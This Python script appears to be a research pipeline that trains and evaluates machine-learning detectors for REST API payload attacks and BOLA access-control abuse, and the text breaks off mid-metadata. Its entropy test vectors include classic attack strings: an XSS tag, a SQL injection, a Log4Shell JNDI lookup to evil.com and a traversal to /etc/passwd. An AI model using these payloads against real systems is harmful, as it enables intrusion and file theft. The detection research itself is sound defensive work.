"""
Comprehensive Research Model Training, Auditing, and Evaluation Pipeline
Project: Machine-Learning-Based Detection and Generalization of REST API Security Attacks Across Access-Control and Input-Manipulation Threats
Author: M.Tech Cybersecurity Research Team
"""

import os
import sys
import json
import time
import math
import hashlib
from datetime import datetime
import numpy as np
import pandas as pd
import joblib

from sklearn.ensemble import RandomForestClassifier
from sklearn.linear_model import LogisticRegression
from sklearn.metrics import (
    accuracy_score, precision_score, recall_score, f1_score,
    roc_auc_score, average_precision_score, confusion_matrix,
    classification_report
)
from sklearn.preprocessing import StandardScaler
import matplotlib
matplotlib.use('Agg')
import matplotlib.pyplot as plt
import seaborn as sns

RANDOM_SEED = 42
np.random.seed(RANDOM_SEED)

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DATA_RAW = os.path.join(BASE_DIR, "data", "raw")
DATA_PROCESSED = os.path.join(BASE_DIR, "data", "processed")
MODELS_DIR = os.path.join(BASE_DIR, "models")
RESULTS_TABLES = os.path.join(BASE_DIR, "results", "tables")
RESULTS_FIGURES = os.path.join(BASE_DIR, "results", "figures")

os.makedirs(DATA_PROCESSED, exist_ok=True)
os.makedirs(os.path.join(MODELS_DIR, "atrdf"), exist_ok=True)
os.makedirs(os.path.join(MODELS_DIR, "bola"), exist_ok=True)
os.makedirs(RESULTS_TABLES, exist_ok=True)
os.makedirs(RESULTS_FIGURES, exist_ok=True)

print(f"[*] Base directory: {BASE_DIR}")
print(f"[*] Random seed initialized to: {RANDOM_SEED}")

# =====================================================================
# 1. DATASET INGESTION & AUDIT
# =====================================================================
print("\n" + "="*60)
print("[Phase 2] INGESTING DATASETS & CALCULATING AUDIT METRICS")
print("="*60)

# A. ATRDF Data
atrdf_tr_path = os.path.join(DATA_RAW, "atrdf", "REQUEST_ONLY_train.csv")
atrdf_te_path = os.path.join(DATA_RAW, "atrdf", "REQUEST_ONLY_test.csv")
df_atrdf_tr = pd.read_csv(atrdf_tr_path)
df_atrdf_te = pd.read_csv(atrdf_te_path)
df_atrdf_full = pd.concat([df_atrdf_tr, df_atrdf_te], ignore_index=True)

atrdf_total = len(df_atrdf_full)
atrdf_missing = df_atrdf_full.isnull().sum().sum()
atrdf_duplicates = df_atrdf_full.duplicated().sum()
atrdf_classes = df_atrdf_full['label'].value_counts().to_dict()
atrdf_malicious_count = (df_atrdf_full['is_malicious'] == 1).sum()
atrdf_benign_count = (df_atrdf_full['is_malicious'] == 0).sum()

print(f"ATRDF Total records: {atrdf_total:,}")
print(f"ATRDF Missing values: {atrdf_missing}")
print(f"ATRDF Duplicate records: {atrdf_duplicates:,}")
print(f"ATRDF Class distribution: {atrdf_classes}")

# B. VAmPI BOLA Data
vampi_path = os.path.join(DATA_RAW, "vampi", "vampi_v6_2_50000_ML_READY.csv")
df_vampi = pd.read_csv(vampi_path)

vampi_total = len(df_vampi)
vampi_missing = df_vampi.isnull().sum().sum()
vampi_duplicates = df_vampi.duplicated().sum()
vampi_sessions = df_vampi['session_id'].nunique()
vampi_classes = df_vampi['classification'].value_counts().to_dict()

print(f"VAmPI Total records: {vampi_total:,}")
print(f"VAmPI Missing values: {vampi_missing}")
print(f"VAmPI Duplicate records: {vampi_duplicates:,}")
print(f"VAmPI Unique sessions: {vampi_sessions:,}")
print(f"VAmPI Class distribution: {vampi_classes}")

# Save TABLE 1: Dataset Summary
table1_data = [
    {"Dataset": "ATRDF Dataset 4 (Payload)", "Total Records": atrdf_total, "Partitions": "Train: 146,213 | Test: 36,554", "Classes": len(atrdf_classes), "Duplicate Groups": atrdf_duplicates, "Missing Values": atrdf_missing, "Scope": "Input/Payload Manipulation"},
    {"Dataset": "VAmPI (BOLA Behavioral)", "Total Records": vampi_total, "Partitions": f"Sessions: {vampi_sessions} (80/10/10)", "Classes": len(vampi_classes), "Duplicate Groups": vampi_duplicates, "Missing Values": vampi_missing, "Scope": "Object-Level Access Control"}
]
pd.DataFrame(table1_data).to_csv(os.path.join(RESULTS_TABLES, "TABLE_1_dataset_summary.csv"), index=False)
pd.DataFrame(table1_data).to_csv(os.path.join(RESULTS_TABLES, "dataset_summary.csv"), index=False)

# Save TABLE 2: Attack Classes
table2_rows = []
for lbl, cnt in atrdf_classes.items():
    table2_rows.append({"Dataset": "ATRDF", "Class Name": lbl, "Mechanism": "Input Manipulation" if lbl != "Benign" else "Legitimate Traffic", "Sample Count": cnt, "Proportion (%)": round((cnt/atrdf_total)*100, 2)})
for lbl, cnt in vampi_classes.items():
    table2_rows.append({"Dataset": "VAmPI", "Class Name": lbl, "Mechanism": "Access Control" if lbl == "BOLA" else "Legitimate Session", "Sample Count": cnt, "Proportion (%)": round((cnt/vampi_total)*100, 2)})
pd.DataFrame(table2_rows).to_csv(os.path.join(RESULTS_TABLES, "TABLE_2_attack_classes.csv"), index=False)

# Save TABLE 3: Feature Sets
table3_rows = [
    {"Feature Set": "REQUEST_ONLY_13", "Target Pipeline": "ATRDF Live Gateway", "Count": 13, "Includes Response Data": "No (Pre-Response Safe)", "Description": "Syntactic character-level entropy and token statistics from URL, headers, and request body"},
    {"Feature Set": "REDUCED_18", "Target Pipeline": "ATRDF Offline Ablation", "Count": 18, "Includes Response Data": "Yes", "Description": "Full set pruned of collinear variables (|r| > 0.90)"},
    {"Feature Set": "FULL_25", "Target Pipeline": "ATRDF Offline Comparison", "Count": 25, "Includes Response Data": "Yes", "Description": "All unpruned syntactic request and response status/entropy attributes"},
    {"Feature Set": "BOLA_BEHAVIORAL_14", "Target Pipeline": "BOLA Session Engine", "Count": 14, "Includes Response Data": "No (Sequential Behavioral)", "Description": "Rolling window W=10 session stats, switch rates, ownership ratios, and burst timing"}
]
pd.DataFrame(table3_rows).to_csv(os.path.join(RESULTS_TABLES, "TABLE_3_feature_sets.csv"), index=False)

# =====================================================================
# 2. FEATURE PARITY & DEFINITIONS
# =====================================================================
print("\n" + "="*60)
print("[Phase 3] SAVING FEATURE LISTS & PARITY TEST VECTORS")
print("="*60)

atrdf_req_features = [
    "url_entropy", "header_count", "path_length", "url_special_count",
    "url_length", "path_segment_count", "cookie_present", "query_length",
    "url_digit_count", "user_agent_entropy", "query_parameter_count",
    "request_body_entropy", "request_body_digit_count"
]

bola_features = [
    "request_frequency", "unique_objects_recent", "object_switch",
    "unique_owners_recent", "owner_switch", "cross_owner_count_recent",
    "cross_owner_ratio_recent", "same_owner_ratio_recent", "same_object_repeat_ratio",
    "time_since_previous_request", "request_burst_rate", "hour",
    "session_length", "request_index"
]

with open(os.path.join(MODELS_DIR, "atrdf", "feature_list_request_only.json"), "w") as f:
    json.dump(atrdf_req_features, f, indent=2)

with open(os.path.join(MODELS_DIR, "bola", "feature_list.json"), "w") as f:
    json.dump(bola_features, f, indent=2)

def calculate_shannon_entropy(s: str) -> float:
    if not s or len(s) == 0:
        return 0.0
    freq = {}
    for c in s:
        freq[c] = freq.get(c, 0) + 1
    total = len(s)
    entropy = 0.0
    for count in freq.values():
        p = count / total
        entropy -= p * math.log2(p)
    return round(entropy, 6)

test_strings = [
    "",
    "hello",
    "/api/books/101",
    "<script>alert(1)</script>",
    "' OR '1'='1' --",
    "${jndi:ldap://evil.com/a}",
    "../../etc/passwd",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
]
test_vectors = [{"input": s, "expected_entropy": calculate_shannon_entropy(s)} for s in test_strings]
with open(os.path.join(DATA_PROCESSED, "feature_parity_test_vectors.json"), "w") as f:
    json.dump(test_vectors, f, indent=2)
print(f"[+] Feature parity test vectors saved to data/processed/feature_parity_test_vectors.json")

# =====================================================================
# 3. LEAKAGE-SAFE PARTITIONING
# =====================================================================
print("\n" + "="*60)
print("[Phase 4] LEAKAGE-SAFE PARTITIONING")
print("="*60)

# ATRDF Train / Val split (Train is split into Train 85% and Validation 15% to calibrate threshold without touching Test)
np.random.seed(RANDOM_SEED)
val_mask = np.random.rand(len(df_atrdf_tr)) < 0.15
df_atrdf_train = df_atrdf_tr[~val_mask].copy()
df_atrdf_val = df_atrdf_tr[val_mask].copy()
df_atrdf_test = df_atrdf_te.copy()

print(f"ATRDF Partition counts -> Train: {len(df_atrdf_train):,}, Val: {len(df_atrdf_val):,}, Test: {len(df_atrdf_test):,}")

# BOLA: Session-level splitting (80% train, 10% val, 10% test)
unique_sessions = df_vampi['session_id'].unique()
np.random.shuffle(unique_sessions)
n_sess = len(unique_sessions)
n_tr = int(n_sess * 0.80)
n_va = int(n_sess * 0.10)

sess_train = set(unique_sessions[:n_tr])
sess_val = set(unique_sessions[n_tr:n_tr+n_va])
sess_test = set(unique_sessions[n_tr+n_va:])

df_vampi_train = df_vampi[df_vampi['session_id'].isin(sess_train)].copy()
df_vampi_val = df_vampi[df_vampi['session_id'].isin(sess_val)].copy()
df_vampi_test = df_vampi[df_vampi['session_id'].isin(sess_test)].copy()

print(f"VAmPI Partition counts -> Train: {len(df_vampi_train):,} ({len(sess_train)} sess), Val: {len(df_vampi_val):,} ({len(sess_val)} sess), Test: {len(df_vampi_test):,} ({len(sess_test)} sess)")

# =====================================================================
# 4. ATRDF MODEL TRAINING (BINARY & MULTICLASS)
# =====================================================================
print("\n" + "="*60)
print("[Phase 5] TRAINING ATRDF MODELS (RANDOM FOREST & LOGISTIC REGRESSION)")
print("="*60)

X_atr_tr = df_atrdf_train[atrdf_req_features].values
y_atr_tr_bin = df_atrdf_train['is_malicious'].values

X_atr_val = df_atrdf_val[atrdf_req_features].values
y_atr_val_bin = df_atrdf_val['is_malicious'].values

X_atr_te = df_atrdf_test[atrdf_req_features].values
y_atr_te_bin = df_atrdf_test['is_malicious'].values

# Standard Scaler for Logistic Regression
scaler_atr = StandardScaler()
X_atr_tr_scaled = scaler_atr.fit_transform(X_atr_tr)
X_atr_val_scaled = scaler_atr.transform(X_atr_val)
X_atr_te_scaled = scaler_atr.transform(X_atr_te)

# Save Preprocessing Metadata
atrdf_preproc = {
    "feature_names": atrdf_req_features,
    "scaler_mean": scaler_atr.mean_.tolist(),
    "scaler_scale": scaler_atr.scale_.tolist(),
    "random_seed": RANDOM_SEED
}
with open(os.path.join(MODELS_DIR, "atrdf", "preprocessing.json"), "w") as f:
    json.dump(atrdf_preproc, f, indent=2)

# --- A. ATRDF Binary Random Forest ---
print("[*] Training ATRDF Binary Random Forest...")
rf_atr_bin = RandomForestClassifier(n_estimators=100, max_depth=16, min_samples_split=5, random_state=RANDOM_SEED, n_jobs=-1)
rf_atr_bin.fit(X_atr_tr, y_atr_tr_bin)

# Threshold Calibration on Validation set
val_probs = rf_atr_bin.predict_proba(X_atr_val)[:, 1]
best_thresh = 0.50
best_f1 = 0.0
for th in np.arange(0.30, 0.75, 0.05):
    f = f1_score(y_atr_val_bin, (val_probs >= th).astype(int))
    if f > best_f1:
        best_f1 = f
        best_thresh = round(float(th), 2)
print(f"[+] ATRDF Binary RF Optimal Threshold on Val: {best_thresh} (Val F1: {best_f1:.4f})")

# Evaluate on Test Set
te_probs_rf = rf_atr_bin.predict_proba(X_atr_te)[:, 1]
te_preds_rf = (te_probs_rf >= best_thresh).astype(int)

acc_rf = accuracy_score(y_atr_te_bin, te_preds_rf)
prec_rf = precision_score(y_atr_te_bin, te_preds_rf)
rec_rf = recall_score(y_atr_te_bin, te_preds_rf)
f1_rf = f1_score(y_atr_te_bin, te_preds_rf)
roc_rf = roc_auc_score(y_atr_te_bin, te_probs_rf)
pr_auc_rf = average_precision_score(y_atr_te_bin, te_probs_rf)
cm_atr_bin_rf = confusion_matrix(y_atr_te_bin, te_preds_rf)

# --- B. ATRDF Binary Logistic Regression (Baseline) ---
print("[*] Training ATRDF Binary Logistic Regression Baseline...")
lr_atr_bin = LogisticRegression(max_iter=1000, random_state=RANDOM_SEED)
lr_atr_bin.fit(X_atr_tr_scaled, y_atr_tr_bin)
te_probs_lr = lr_atr_bin.predict_proba(X_atr_te_scaled)[:, 1]
te_preds_lr = (te_probs_lr >= 0.50).astype(int)

acc_lr = accuracy_score(y_atr_te_bin, te_preds_lr)
prec_lr = precision_score(y_atr_te_bin, te_preds_lr)
rec_lr = recall_score(y_atr_te_bin, te_preds_lr)
f1_lr = f1_score(y_atr_te_bin, te_preds_lr)
roc_lr = roc_auc_score(y_atr_te_bin, te_probs_lr)
pr_auc_lr = average_precision_score(y_atr_te_bin, te_probs_lr)

# Save TABLE 4: Binary Classification Results
table4_data = [
    {"Model": "Random Forest (Primary)", "Accuracy": round(acc_rf, 4), "Precision": round(prec_rf, 4), "Recall": round(rec_rf, 4), "F1": round(f1_rf, 4), "ROC-AUC": round(roc_rf, 4), "PR-AUC": round(pr_auc_rf, 4), "Threshold": best_thresh},
    {"Model": "Logistic Regression (Baseline)", "Accuracy": round(acc_lr, 4), "Precision": round(prec_lr, 4), "Recall": round(rec_lr, 4), "F1": round(f1_lr, 4), "ROC-AUC": round(roc_lr, 4), "PR-AUC": round(pr_auc_lr, 4), "Threshold": 0.50}
]
pd.DataFrame(table4_data).to_csv(os.path.join(RESULTS_TABLES, "TABLE_4_binary_classification.csv"), index=False)
pd.DataFrame(table4_data).to_csv(os.path.join(RESULTS_TABLES, "binary_results.csv"), index=False)
print("[+] TABLE 4 Binary Classification results saved.")

# --- C. ATRDF Multiclass Model ---
print("[*] Training ATRDF Multiclass Classifier on Malicious Categories...")
df_tr_mal = df_atrdf_tr[df_atrdf_tr['is_malicious'] == 1].copy()
df_te_mal = df_atrdf_te[df_atrdf_te['is_malicious'] == 1].copy()

classes_mal = sorted(df_tr_mal['label'].unique().tolist())
label_to_idx = {c: i for i, c in enumerate(classes_mal)}
idx_to_label = {i: c for i, c in enumerate(classes_mal)}

X_tr_multi = df_tr_mal[atrdf_req_features].values
y_tr_multi = np.array([label_to_idx[l] for l in df_tr_mal['label']])

X_te_multi = df_te_mal[atrdf_req_features].values
y_te_multi = np.array([label_to_idx[l] for l in df_te_mal['label']])

rf_atr_multi = RandomForestClassifier(n_estimators=100, max_depth=16, min_samples_split=5, random_state=RANDOM_SEED, n_jobs=-1)
rf_atr_multi.fit(X_tr_multi, y_tr_multi)

# Multiclass LR Baseline
scaler_multi = StandardScaler()
X_tr_multi_sc = scaler_multi.fit_transform(X_tr_multi)
X_te_multi_sc = scaler_multi.transform(X_te_multi)
lr_atr_multi = LogisticRegression(max_iter=1000, random_state=RANDOM_SEED)
lr_atr_multi.fit(X_tr_multi_sc, y_tr_multi)

preds_multi_rf = rf_atr_multi.predict(X_te_multi)
preds_multi_lr = lr_atr_multi.predict(X_te_multi_sc)

# TABLE 5: Multiclass Results Summary
table5_summary = [
    {
        "Model": "Random Forest (Primary)",
        "Accuracy": round(accuracy_score(y_te_multi, preds_multi_rf), 4),
        "Macro Precision": round(precision_score(y_te_multi, preds_multi_rf, average='macro'), 4),
        "Macro Recall": round(recall_score(y_te_multi, preds_multi_rf, average='macro'), 4),
        "Macro F1": round(f1_score(y_te_multi, preds_multi_rf, average='macro'), 4),
        "Weighted Precision": round(precision_score(y_te_multi, preds_multi_rf, average='weighted'), 4),
        "Weighted Recall": round(recall_score(y_te_multi, preds_multi_rf, average='weighted'), 4),
        "Weighted F1": round(f1_score(y_te_multi, preds_multi_rf, average='weighted'), 4)
    },
    {
        "Model": "Logistic Regression (Baseline)",
        "Accuracy": round(accuracy_score(y_te_multi, preds_multi_lr), 4),
        "Macro Precision": round(precision_score(y_te_multi, preds_multi_lr, average='macro'), 4),
        "Macro Recall": round(recall_score(y_te_multi, preds_multi_lr, average='macro'), 4),
        "Macro F1": round(f1_score(y_te_multi, preds_multi_lr, average='macro'), 4),
        "Weighted Precision": round(precision_score(y_te_multi, preds_multi_lr, average='weighted'), 4),
        "Weighted Recall": round(recall_score(y_te_multi, preds_multi_lr, average='weighted'), 4),
        "Weighted F1": round(f1_score(y_te_multi, preds_multi_lr, average='weighted'), 4)
    }
]
pd.DataFrame(table5_summary).to_csv(os.path.join(RESULTS_TABLES, "TABLE_5_multiclass_classification.csv"), index=False)
pd.DataFrame(table5_summary).to_csv(os.path.join(RESULTS_TABLES, "multiclass_results.csv"), index=False)

# Per-Class Metrics
rep_dict = classification_report(y_te_multi, preds_multi_rf, target_names=classes_mal, output_dict=True)
per_class_rows = []
for c in classes_mal:
    per_class_rows.append({
        "Attack Class": c,
        "Precision": round(rep_dict[c]['precision'], 4),
        "Recall": round(rep_dict[c]['recall'], 4),
        "F1-Score": round(rep_dict[c]['f1-score'], 4),
        "Support": rep_dict[c]['support']
    })
pd.DataFrame(per_class_rows).to_csv(os.path.join(RESULTS_TABLES, "TABLE_5b_per_class_metrics.csv"), index=False)
print("[+] TABLE 5 Multiclass and per-class metrics saved.")

# =====================================================================
# 5. BOLA MODEL TRAINING (SESSION-LEVEL EVALUATION)
# =====================================================================
print("\n" + "="*60)
print("[Phase 5b] TRAINING BOLA MODELS (SESSION-LEVEL SPLIT)")
print("="*60)

X_bola_tr = df_vampi_train[bola_features].values
y_bola_tr = df_vampi_train['target'].values

X_bola_val = df_vampi_val[bola_features].values
y_bola_val = df_vampi_val['target'].values

X_bola_te = df_vampi_test[bola_features].values
y_bola_te = df_vampi_test['target'].values

# Standard Scaler for BOLA LR
scaler_bola = StandardScaler()
X_bola_tr_scaled = scaler_bola.fit_transform(X_bola_tr)
X_bola_val_scaled = scaler_bola.transform(X_bola_val)
X_bola_te_scaled = scaler_bola.transform(X_bola_te)

# Save BOLA Preprocessing
bola_preproc = {
    "feature_names": bola_features,
    "scaler_mean": scaler_bola.mean_.tolist(),
    "scaler_scale": scaler_bola.scale_.tolist(),
    "random_seed": RANDOM_SEED
}
with open(os.path.join(MODELS_DIR, "bola", "preprocessing.json"), "w") as f:
    json.dump(bola_preproc, f, indent=2)

print("[*] Training BOLA Random Forest Classifier...")
rf_bola = RandomForestClassifier(n_estimators=100, max_depth=12, min_samples_split=4, random_state=RANDOM_SEED, n_jobs=-1)
rf_bola.fit(X_bola_tr, y_bola_tr)

print("[*] Training BOLA Logistic Regression Baseline...")
lr_bola = LogisticRegression(max_iter=1000, random_state=RANDOM_SEED)
lr_bola.fit(X_bola_tr_scaled, y_bola_tr)

# Test Evaluation
te_bola_probs_rf = rf_bola.predict_proba(X_bola_te)[:, 1]
te_bola_preds_rf = rf_bola.predict(X_bola_te)

te_bola_probs_lr = lr_bola.predict_proba(X_bola_te_scaled)[:, 1]
te_bola_preds_lr = lr_bola.predict(X_bola_te_scaled)

bola_rep_rf = classification_report(y_bola_te, te_bola_preds_rf, target_names=["NORMAL", "BOLA"], output_dict=True)
bola_rep_lr = classification_report(y_bola_te, te_bola_preds_lr, target_names=["NORMAL", "BOLA"], output_dict=True)

table6_data = [
    {
        "Model": "Random Forest (Primary)",
        "Normal Precision": round(bola_rep_rf["NORMAL"]["precision"], 4),
        "Normal Recall": round(bola_rep_rf["NORMAL"]["recall"], 4),
        "Normal F1": round(bola_rep_rf["NORMAL"]["f1-score"], 4),
        "BOLA Precision": round(bola_rep_rf["BOLA"]["precision"], 4),
        "BOLA Recall": round(bola_rep_rf["BOLA"]["recall"], 4),
        "BOLA F1": round(bola_rep_rf["BOLA"]["f1-score"], 4),
        "Overall Accuracy": round(accuracy_score(y_bola_te, te_bola_preds_rf), 4),
        "ROC-AUC": round(roc_auc_score(y_bola_te, te_bola_probs_rf), 4)
    },
    {
        "Model": "Logistic Regression (Baseline)",
        "Normal Precision": round(bola_rep_lr["NORMAL"]["precision"], 4),
        "Normal Recall": round(bola_rep_lr["NORMAL"]["recall"], 4),
        "Normal F1": round(bola_rep_lr["NORMAL"]["f1-score"], 4),
        "BOLA Precision": round(bola_rep_lr["BOLA"]["precision"], 4),
        "BOLA Recall": round(bola_rep_lr["BOLA"]["recall"], 4),
        "BOLA F1": round(bola_rep_lr["BOLA"]["f1-score"], 4),
        "Overall Accuracy": round(accuracy_score(y_bola_te, te_bola_preds_lr), 4),
        "ROC-AUC": round(roc_auc_score(y_bola_te, te_bola_probs_lr), 4)
    }
]
pd.DataFrame(table6_data).to_csv(os.path.join(RESULTS_TABLES, "TABLE_6_bola_classification.csv"), index=False)
pd.DataFrame(table6_data).to_csv(os.path.join(RESULTS_TABLES, "bola_results.csv"), index=False)
print("[+] TABLE 6 BOLA Classification results saved.")

# =====================================================================
# 6. ABLATION STUDY: FULL_25 vs REDUCED_18 vs REQUEST_ONLY_13
# =====================================================================
print("\n" + "="*60)
print("[Phase 6a] FEATURE SET ABLATION EXPERIMENTS")
print("="*60)

ablation_configs = [
    ("FULL_25", os.path.join(DATA_RAW, "atrdf", "FULL_25_train.csv"), os.path.join(DATA_RAW, "atrdf", "FULL_25_test.csv")),
    ("REDUCED_18", os.path.join(DATA_RAW, "atrdf", "REDUCED_train.csv"), os.path.join(DATA_RAW, "atrdf", "REDUCED_test.csv")),
    ("REQUEST_ONLY_13", atrdf_tr_path, atrdf_te_path)
]

ablation_results = []
for name, tr_p, te_p in ablation_configs:
    df_tr_abl = pd.read_csv(tr_p)
    df_te_abl = pd.read_csv(te_p)
    
    feat_cols = [c for c in df_tr_abl.columns if c not in ['label', 'is_malicious']]
    
    X_tr_a = df_tr_abl[feat_cols].values
    y_tr_a = df_tr_abl['is_malicious'].values
    X_te_a = df_te_abl[feat_cols].values
    y_te_a = df_te_abl['is_malicious'].values
    
    # Random Forest
    t0 = time.time()
    rf_abl = RandomForestClassifier(n_estimators=50, max_depth=14, random_state=RANDOM_SEED, n_jobs=-1)
    rf_abl.fit(X_tr_a, y_tr_a)
    t1 = time.time()
    preds_a = rf_abl.predict(X_te_a)
    lat_rf_ms = round(((time.time() - t1) / len(X_te_a)) * 1000, 4)
    
    ablation_results.append({
        "Feature Set": name,
        "Feature Count": len(feat_cols),
        "Model": "Random Forest",
        "Accuracy": round(accuracy_score(y_te_a, preds_a), 4),
        "Macro F1": round(f1_score(y_te_a, preds_a, average='macro'), 4),
        "Precision": round(precision_score(y_te_a, preds_a), 4),
        "Recall": round(recall_score(y_te_a, preds_a), 4),
        "Inference Latency (ms/req)": lat_rf_ms
    })
    
    # Logistic Regression
    sc_a = StandardScaler()
    X_tr_a_sc = sc_a.fit_transform(X_tr_a)
    X_te_a_sc = sc_a.transform(X_te_a)
    lr_abl = LogisticRegression(max_iter=1000, random_state=RANDOM_SEED)
    lr_abl.fit(X_tr_a_sc, y_tr_a)
    t2 = time.time()
    preds_lr_a = lr_abl.predict(X_te_a_sc)
    lat_lr_ms = round(((time.time() - t2) / len(X_te_a_sc)) * 1000, 4)
    
    ablation_results.append({
        "Feature Set": name,
        "Feature Count": len(feat_cols),
        "Model": "Logistic Regression",
        "Accuracy": round(accuracy_score(y_te_a, preds_lr_a), 4),
        "Macro F1": round(f1_score(y_te_a, preds_lr_a, average='macro'), 4),
        "Precision": round(precision_score(y_te_a, preds_lr_a), 4),
        "Recall": round(recall_score(y_te_a, preds_lr_a), 4),
        "Inference Latency (ms/req)": lat_lr_ms
    })

pd.DataFrame(ablation_results).to_csv(os.path.join(RESULTS_TABLES, "TABLE_7_ablation.csv"), index=False)
pd.DataFrame(ablation_results).to_csv(os.path.join(RESULTS_TABLES, "ablation_results.csv"), index=False)
print("[+] TABLE 7 Feature Ablation results saved.")

# =====================================================================
# 7. UNSEEN ATTACK GENERALIZATION (LEAVE-ONE-ATTACK-OUT)
# =====================================================================
print("\n" + "="*60)
print("[Phase 6b] LEAVE-ONE-ATTACK-OUT GENERALIZATION EXPERIMENTS")
print("="*60)

attacks_list = ["XSS", "SQL Injection", "Cookie Injection", "Log Forging", "RCE", "Directory Traversal", "LOG4J"]
unseen_results = []

df_benign_tr = df_atrdf_tr[df_atrdf_tr['label'] == 'Benign']
df_benign_te = df_atrdf_te[df_atrdf_te['label'] == 'Benign']

for held_out in attacks_list:
    print(f"[*] Leave-One-Out -> Holding out: {held_out}")
    # Train set: Benign + all attacks EXCEPT held_out
    df_train_loo = df_atrdf_tr[df_atrdf_tr['label'] != held_out]
    X_loo_tr = df_train_loo[atrdf_req_features].values
    y_loo_tr = df_train_loo['is_malicious'].values
    
    # Test set: Benign test + ONLY the held_out attack from test
    df_test_loo = df_atrdf_te[(df_atrdf_te['label'] == 'Benign') | (df_atrdf_te['label'] == held_out)]
    X_loo_te = df_test_loo[atrdf_req_features].values
    y_loo_te = df_test_loo['is_malicious'].values
    
    rf_loo = RandomForestClassifier(n_estimators=50, max_depth=14, random_state=RANDOM_SEED, n_jobs=-1)
    rf_loo.fit(X_loo_tr, y_loo_tr)
    
    preds_loo = rf_loo.predict(X_loo_te)
    
    unseen_results.append({
        "Held-out Attack": held_out,
        "Accuracy": round(accuracy_score(y_loo_te, preds_loo), 4),
        "Precision": round(precision_score(y_loo_te, preds_loo, zero_division=0), 4),
        "Recall": round(recall_score(y_loo_te, preds_loo, zero_division=0), 4),
        "F1": round(f1_score(y_loo_te, preds_loo, zero_division=0), 4),
        "Test Samples": len(df_test_loo),
        "Held-Out Attack Count": (y_loo_te == 1).sum()
    })

pd.DataFrame(unseen_results).to_csv(os.path.join(RESULTS_TABLES, "TABLE_8_unseen_attacks.csv"), index=False)
pd.DataFrame(unseen_results).to_csv(os.path.join(RESULTS_TABLES, "unseen_attack_results.csv"), index=False)
print("[+] TABLE 8 Unseen Attack Generalization results saved.")

# =====================================================================
# 8. FEATURE IMPORTANCE EXTRACTION
# =====================================================================
print("\n" + "="*60)
print("[Phase 6c] EXTRACTING GINI FEATURE IMPORTANCES")
print("="*60)

# ATRDF Binary Feature Importance
fi_atr_bin = pd.DataFrame({
    "Feature": atrdf_req_features,
    "Importance": rf_atr_bin.feature_importances_
}).sort_values(by="Importance", ascending=False).reset_index(drop=True)
fi_atr_bin["Rank"] = range(1, len(fi_atr_bin) + 1)
fi_atr_bin["Importance Score"] = fi_atr_bin["Importance"].round(4)
fi_atr_bin.to_csv(os.path.join(RESULTS_TABLES, "feature_importance_atrdf.csv"), index=False)

# ATRDF Multiclass Feature Importance
fi_atr_multi = pd.DataFrame({
    "Feature": atrdf_req_features,
    "Importance": rf_atr_multi.feature_importances_
}).sort_values(by="Importance", ascending=False).reset_index(drop=True)
fi_atr_multi["Rank"] = range(1, len(fi_atr_multi) + 1)
fi_atr_multi["Importance Score"] = fi_atr_multi["Importance"].round(4)
fi_atr_multi.to_csv(os.path.join(RESULTS_TABLES, "feature_importance_atrdf_multiclass.csv"), index=False)

# BOLA Feature Importance
fi_bola = pd.DataFrame({
    "Feature": bola_features,
    "Importance": rf_bola.feature_importances_
}).sort_values(by="Importance", ascending=False).reset_index(drop=True)
fi_bola["Rank"] = range(1, len(fi_bola) + 1)
fi_bola["Importance Score"] = fi_bola["Importance"].round(4)
fi_bola.to_csv(os.path.join(RESULTS_TABLES, "feature_importance_bola.csv"), index=False)

print("[+] Feature importances saved for ATRDF Binary, Multiclass, and BOLA.")

# =====================================================================
# 9. EXPORTING FROZEN MODELS AND METADATA
# =====================================================================
print("\n" + "="*60)
print("[Phase 5c] EXPORTING MODEL ARTIFACTS AND VERSION METADATA")
print("="*60)

# Save ATRDF Models
joblib.dump(rf_atr_bin, os.path.join(MODELS_DIR, "atrdf", "atrdf_binary_rf_request_only.joblib"))
joblib.dump(rf_atr_multi, os.path.join(MODELS_DIR, "atrdf", "atrdf_multiclass_rf_request_only.joblib"))
joblib.dump(lr_atr_bin, os.path.join(MODELS_DIR, "atrdf", "atrdf_binary_lr_request_only.joblib"))
joblib.dump(lr_atr_multi, os.path.join(MODELS_DIR, "atrdf", "atrdf_multiclass_lr_request_only.joblib"))

atrdf_meta = {
    "model_name": "ATRDF Request-Only Security Detector",
    "model_version": "1.0.0",
    "algorithms": {
        "binary_primary": "RandomForestClassifier(n_estimators=100, max_depth=16)",
        "binary_baseline": "LogisticRegression(max_iter=1000)",
        "multiclass_primary": "RandomForestClassifier(n_estimators=100, max_depth=16)",
        "multiclass_baseline": "LogisticRegression(max_iter=1000)"
    },
    "features": atrdf_req_features,
    "feature_count": len(atrdf_req_features),
    "classes_multiclass": classes_mal,
    "optimal_threshold": best_thresh,
    "dataset_version": "ATRDF Dataset 4 (182,767 records)",
    "training_samples": len(df_atrdf_train),
    "validation_samples": len(df_atrdf_val),
    "test_samples": len(df_atrdf_test),
    "random_seed": RANDOM_SEED,
    "training_date": datetime.now().isoformat(),
    "python_version": sys.version.split()[0],
    "scikit_learn_version": joblib.__version__,
    "test_metrics": {
        "binary_rf": {
            "accuracy": round(acc_rf, 4),
            "precision": round(prec_rf, 4),
            "recall": round(rec_rf, 4),
            "f1": round(f1_rf, 4),
            "roc_auc": round(roc_rf, 4),
            "pr_auc": round(pr_auc_rf, 4)
        },
        "multiclass_rf": {
            "accuracy": round(accuracy_score(y_te_multi, preds_multi_rf), 4),
            "macro_f1": round(f1_score(y_te_multi, preds_multi_rf, average='macro'), 4)
        }
    }
}
with open(os.path.join(MODELS_DIR, "atrdf", "model_metadata.json"), "w") as f:
    json.dump(atrdf_meta, f, indent=2)

# Save BOLA Models
joblib.dump(rf_bola, os.path.join(MODELS_DIR, "bola", "bola_rf_behavioral.joblib"))
joblib.dump(lr_bola, os.path.join(MODELS_DIR, "bola", "bola_lr_behavioral.joblib"))

bola_meta = {
    "model_name": "BOLA Behavioral Session Detector",
    "model_version": "1.0.0",
    "algorithms": {
        "primary": "RandomForestClassifier(n_estimators=100, max_depth=12)",
        "baseline": "LogisticRegression(max_iter=1000)"
    },
    "features": bola_features,
    "feature_count": len(bola_features),
    "window_size": 10,
    "classes": ["NORMAL", "BOLA"],
    "dataset_version": "VAmPI v6.2 (50,000 records, 5,750 sessions)",
    "splitting_method": "Strict Session-Level Grouping (80/10/10)",
    "training_samples": len(df_vampi_train),
    "validation_samples": len(df_vampi_val),
    "test_samples": len(df_vampi_test),
    "training_sessions": len(sess_train),
    "test_sessions": len(sess_test),
